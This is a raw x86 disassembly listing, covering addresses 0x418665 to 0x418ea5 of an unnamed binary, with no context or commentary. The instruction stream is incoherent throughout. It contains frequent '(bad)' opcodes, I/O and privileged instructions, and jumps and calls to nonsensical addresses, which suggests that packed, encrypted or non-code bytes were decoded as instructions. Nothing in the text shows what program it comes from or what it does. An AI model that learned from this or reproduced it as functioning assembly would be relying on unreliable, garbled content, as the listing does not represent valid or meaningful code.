  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
